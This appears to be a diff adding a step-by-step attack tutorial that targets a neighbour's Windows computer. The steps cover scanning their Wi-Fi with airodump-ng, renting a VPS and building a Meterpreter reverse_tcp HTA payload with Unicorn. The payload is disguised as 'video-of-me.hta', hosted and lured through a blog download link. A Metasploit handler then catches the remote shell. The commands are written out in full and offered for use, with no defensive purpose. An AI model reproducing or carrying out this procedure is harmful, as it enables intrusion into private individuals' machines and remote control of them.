@@ -1,0 +1,87 @@
+HACK A NEIGHBOOR WITH A POST-IT NOTE
+____________________________________
+
+
+In this tutorial a kind of social engineering attack is used.
+
+Steps do not include the previous social engineering and information gathering needed to know our target
+
+STEPS
+_____
+
+1) Use airodump-ng to view the wireless network of the neighboor and identify the target
+2) We will assume it's a windows system
+
+3) Set up a VPS
+
+   -> Enter signup page
+   -> Create a droplet (cloud server in digital ocean)
+   -> Debian 9 operating system
+   -> Create button to start creating the cloud
+   -> It will be sent an email with ssh password
+   -> As it is finished, the IP will be displayed
+   >> ssh root@Your-Server-IP-Address
+
+   -> Disable Nginx
+
+      >> systemctl stop nginx
+
+4) Create the HTA Payload
+
+   -> Unicorn python script will be used to create an HTML Application (HTA)
+   -> Install python github and python3
+
+   >> apt-get install git python python3
+
+   >> git clone https://github.com/trustedsec/unicorn.git
+
+   >> cd unicorn/
+
+   >> python unicorn.py windows/meterpreter/reverse_tcp YourServerIPAddress 55555 hta
+
+   -> Visit hta_attack, the payload is Launchar.hta
+
+   >> mv Launcher.hta video-of-me.hta
+
+   -> There's an "unicorn.rc" file that will automate Metasploit config for the handler
+
+5) Make the payload accessible from internet
+
+   -> We'll create a simple server to host the file
+
+   -> In the hta_attack directory type
+
+   >> python3 -m http.server 80 &
+
+6) Installl metasploit framework
+
+   -> Install as previously mentioned
+
+   >> curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+
+   
+7) Create a Website to cheat our victim
+
+   -> Victim should visit a commom page such as:
+
+      - Tumblr
+      - WordPress
+      - 000webhost
+      - Wix
+      - ...
+
+   -> This is done by creating a blog where the victim should click
+
+   -> To ensure that the video is downloaded by the victim, it will be needed to includ an html link
+
+   <a href="http://YourServerVPSIPAddressHere/video-of-me.hta">click here to download my video</a>
+
+
+8) Get a custom domain name
+
+   With Dot.tk a custom domain name can be created. It's free to register and some domain names are free to use. For a .com domain, pricing starting from 4$ will be needed. We have to register our tumblr address.
+
+9) Finally, start the handler in the VPS
+
+   >> msfconsole -r /path/to/unicorn.rc
+
